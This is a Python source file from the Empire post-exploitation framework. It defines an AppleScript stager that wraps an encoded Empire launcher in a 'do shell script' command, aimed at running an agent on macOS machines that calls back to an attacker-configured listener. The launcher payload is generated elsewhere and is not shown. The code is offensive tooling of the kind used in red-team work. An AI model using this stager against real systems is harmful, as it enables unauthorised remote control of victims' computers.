from empire.server.core.exceptions import StagerGenerationException


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "AppleScript",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                }
            ],
            "Description": "Generates AppleScript to execute the Empire stage0 launcher.",
            "Comments": [""],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "File to output AppleScript to, otherwise displayed on the screen.",
                "Required": False,
                "Value": "",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]

        # generate the launcher code
        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name,
            language=language,
            encode=True,
            user_agent=user_agent,
        )

        if not launcher:
            raise StagerGenerationException("Error in launcher command generation.")

        launcher = launcher.replace('"', '\\"')
        return f'do shell script "{launcher}"'
